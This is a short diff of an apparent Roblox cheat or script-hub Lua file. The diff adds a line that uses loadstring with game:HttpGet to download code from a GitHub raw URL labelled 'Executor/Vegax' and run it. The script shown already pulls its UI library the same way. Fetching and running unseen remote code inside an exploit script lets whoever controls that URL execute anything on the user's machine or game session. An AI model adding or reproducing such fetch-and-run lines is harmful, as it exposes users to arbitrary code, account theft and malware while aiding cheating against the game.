@@ -61,6 +61,8 @@ CoreGui:SetCore("SendNotification", {
 
 wait(3.5)
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LinAntian/Executor/main/Vegax"))()
+
 local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/LinAntian/TianV1/main/TianV1.UI"))()
 local LBLG = Instance.new("ScreenGui", getParent)
 local LBL = Instance.new("TextLabel", getParent)
